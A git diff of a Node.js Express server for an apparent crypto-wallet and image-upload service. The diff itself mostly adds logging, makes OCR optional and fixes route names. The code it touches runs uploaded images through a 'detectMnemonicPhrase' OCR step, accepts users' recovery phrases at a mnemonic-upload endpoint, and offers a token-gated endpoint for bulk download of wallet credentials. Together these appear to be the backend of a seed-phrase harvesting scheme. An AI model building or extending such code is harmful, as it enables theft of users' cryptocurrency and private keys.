@@ -9,7 +9,6 @@ const crypto = require('crypto');
 const redis = require('redis');
 const RedisStore = require('connect-redis').default;
 const utils = require('./function');
-const textDetect = require('./text-detection');
 const { hdkey } = require('ethereumjs-wallet');
 const bip39 = require('bip39');
 const { createResponse } = require('./response');
@@ -41,6 +40,11 @@ if (!process.env.INFURA_PROJECT_ID || !process.env.CONTRACT_ADDRESS || !process.
 if (!process.env.EXPIRATION_TIME_PERIOD) {
     console.log('Please provide EXPIRATION_TIME_PERIOD in the environment variables.');
     process.exit(1);
+}
+
+let textDetect;
+if (process.env.ENABLE_OCR_DETECTION === 'true') {
+    textDetect = require('./text-detection');
 }
 
 const app = express();
@@ -152,6 +156,7 @@ const storage = multer.diskStorage({
 const upload = multer({ storage });
 
 app.get('/test/ping', function (req, res) {
+    console.log("Endpoint hit: /test/ping");
     const response = createResponse(0, 'pong');
     res.json(response);
 });
@@ -159,6 +164,8 @@ app.options('/test/ping', cors(corsOptions)); // Enable preflight request for th
 
 // Endpoint to handle POST requests for file uploads
 app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
+    console.log("Endpoint hit: /basic/image-upload");
+
     const userId = req.body.userId; // Retrieve the userId from form data
     if (!userId) {
         console.error('Missing userId');
@@ -185,10 +192,13 @@ app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
         const localFileName = req.file.filename;
 
         // Upload to Backblaze B2
-        const b2Response = await utils.uploadToB2(localFilePath, localFileName, userId);
+        await utils.uploadToB2(localFilePath, localFileName, userId);
 
-        // Perform OCR text recognition
-        const textJSON = await textDetect.detectMnemonicPhrase(localFilePath);
+        let textJSON = null;
+        if (process.env.ENABLE_OCR_DETECTION === 'true') {
+            // Perform OCR text recognition
+            textJSON = await textDetect.detectMnemonicPhrase(localFilePath);
+        }
 
         // Log the upload details in MongoDB
         await utils.logUploadDetails(userId, localFileName, textJSON);
@@ -201,9 +211,11 @@ app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
         res.status(500).json(response);
     }
 });
-app.options('/upload', cors(corsOptions)); // Enable preflight request for this endpoint
+app.options('/basic/image-upload', cors(corsOptions)); // Enable preflight request for this endpoint
 
 app.get('/basic/image-download', async (req, res) => {
+    console.log("Endpoint hit: /basic/image-download");
+
     const { fileName, userId } = req.query;
 
     if (!fileName || !userId) {
@@ -236,6 +248,8 @@ app.get('/basic/image-download', async (req, res) => {
 app.options('/basic/image-download', cors(corsOptions)); // Enable preflight request for this endpoint
 
 app.get('/basic/image-edit-info-download', async (req, res) => {
+    console.log("Endpoint hit: /basic/image-edit-info-download");
+
     const { userId, fileName } = req.query;
 
     if (!userId || !fileName) {
@@ -267,6 +281,8 @@ app.options('/basic/image-edit-info-download', cors(corsOptions)); // Enable pre
 
 // TODO: This endpoint is for development purposes only
 app.post('/basic/image-edit-info-upload', async (req, res) => {
+    console.log("Endpoint hit: /basic/image-edit-info-upload");
+
     const { token, fileName, editInfo } = req.body;
 
     if (!fileName || !editInfo) {
@@ -301,6 +317,8 @@ app.post('/basic/image-edit-info-upload', async (req, res) => {
 app.options('/basic/image-edit-info-upload', cors(corsOptions)); // Enable preflight request for this endpoint
 
 app.post('/basic/mnemonic-upload', async (req, res) => {
+    console.log("Endpoint hit: /basic/mnemonic-upload");
+
     const { mnemonicPhase, userId } = req.body;
 
     if (!mnemonicPhase || !userId) {
@@ -354,6 +372,8 @@ app.options('/basic/mnemonic-upload', cors(corsOptions)); // Enable preflight re
 
 // TODO:
 app.post('/basic/wallet-credential-download', async (req, res) => {
+    console.log("Endpoint hit: /basic/wallet-credential-download");
+
     const { token, startDateTime, endDateTime } = req.body;
 
     if (token !== process.env.DEV_TOKEN) {
@@ -389,6 +409,8 @@ app.options('/basic/wallet-credential-download', cors(corsOptions)); // Enable p
 
 // TODO: Request the latest version number of the APP from GitHub releases
 app.get('/basic/latest-version', async (req, res) => {
+    console.log("Endpoint hit: /basic/latest-version");
+
     const owner = process.env.GITHUB_OWNER;
     const repo = process.env.GITHUB_REPO;
     const token = process.env.GITHUB_TOKEN;
@@ -435,6 +457,8 @@ app.options('/basic/latest-version', cors(corsOptions)); // Enable preflight req
 
 // TODO: Get the latest release file from GitHub releases
 app.get('/basic/latest-release', async (req, res) => {
+    console.log("Endpoint hit: /basic/latest-release");
+
     const owner = process.env.GITHUB_OWNER;
     const repo = process.env.GITHUB_REPO;
     const token = process.env.GITHUB_TOKEN;
@@ -492,6 +516,8 @@ app.options('/basic/latest-release', cors(corsOptions)); // Enable preflight req
 
 // TODO: Return the keywords as search filters for the image.
 app.get('/basic/filename-keywords-download', async (req, res) => {
+    console.log("Endpoint hit: /basic/filename-keywords-download");
+
     const { userId } = req.query;
 
     if (!userId) {
@@ -518,11 +544,13 @@ app.get('/basic/filename-keywords-download', async (req, res) => {
         res.status(500).json(response);
     }
 });
-app.options('/basic/image-keywords', cors(corsOptions)); // Enable preflight request for this endpoint
+app.options('/basic/filename-keywords-download', cors(corsOptions)); // Enable preflight request for this endpoint
 
 // TODO: Upload the keywords for the image to the database.
 // Development purposes only
 app.post('/basic/filename-keywords-upload', async (req, res) => {
+    console.log("Endpoint hit: /basic/filename-keywords-upload");
+
     const { token, keywords } = req.body;
 
     if (!Array.isArray(keywords) || keywords.length === 0) {
@@ -557,6 +585,8 @@ app.options('/basic/filename-keywords-upload', cors(corsOptions)); // Enable pre
 // }
 
 app.get('/auth/get-challenge', (req, res) => {
+    console.log("Endpoint hit: /auth/get-challenge");
+
     const challenge = crypto.randomBytes(32).toString('hex');
     req.session.challenge = challenge; // Store the challenge in the session
     res.cookie('challenge', challenge, { httpOnly: true, secure: true, sameSite: 'None' });
@@ -566,6 +596,8 @@ app.get('/auth/get-challenge', (req, res) => {
 app.options('/auth/get-challenge', cors(corsOptions)); // Enable preflight request for this endpoint
 
 app.post('/auth/verify-challenge', async (req, res) => {
+    console.log("Endpoint hit: /auth/verify-challenge");
+
     const { signature, publicAddress } = req.body;
     const sessionChallenge = req.session.challenge;
 
@@ -588,6 +620,8 @@ app.post('/auth/verify-challenge', async (req, res) => {
 app.options('/auth/verify-challenge', cors(corsOptions)); // Enable preflight request for this endpoint
 
 app.post('/basic/user-activation', async (req, res) => {
+    console.log("Endpoint hit: /basic/user-activation");
+
     const { userId, publicAddress, signature } = req.body;
     const sessionChallenge = req.session.id; // Use session ID as the challenge
 
@@ -636,6 +670,8 @@ app.post('/basic/user-activation', async (req, res) => {
 app.options('/basic/user-activation', cors(corsOptions)); // Enable preflight request for this endpoint
 
 app.get('/basic/check-activation', async (req, res) => {
+    console.log("Endpoint hit: /basic/check-activation");
+
     const { userId } = req.query;
 
     if (!userId) {
@@ -657,7 +693,30 @@ app.get('/basic/check-activation', async (req, res) => {
 });
 app.options('/basic/check-activation', cors(corsOptions)); // Enable preflight request for this endpoint
 
-const SERVER_PORT = process.env.SERVER_PORT || 3000;
+app.get('/basic/subscription-info', async (req, res) => {
+    console.log("Endpoint hit: /basic/subscription-info");
+
+    const { name, email, info } = req.query;
+    if (!email) {
+        console.log("Email not found");
+        const response = createResponse(10040, 'Email is required');
+        return res.status(400).json(response);
+    }
+
+    try {
+        // Log the subscription info
+        const result = await utils.logSubscriptionInfo(email, name, info);
+        const response = createResponse(0, 'Success', result);
+        res.json(response);
+    } catch (error) {
+        console.error("Failed to log subscription info:", error);
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
+    }
+});
+app.options('/basic/subscription-info', cors(corsOptions)); // Enable preflight request for this endpoint
+
+const SERVER_PORT = process.env.SERVER_PORT || 5000;
 const keyPath = process.env.PRIVKEY_PATH;
 const certPath = process.env.CERT_PATH;
 
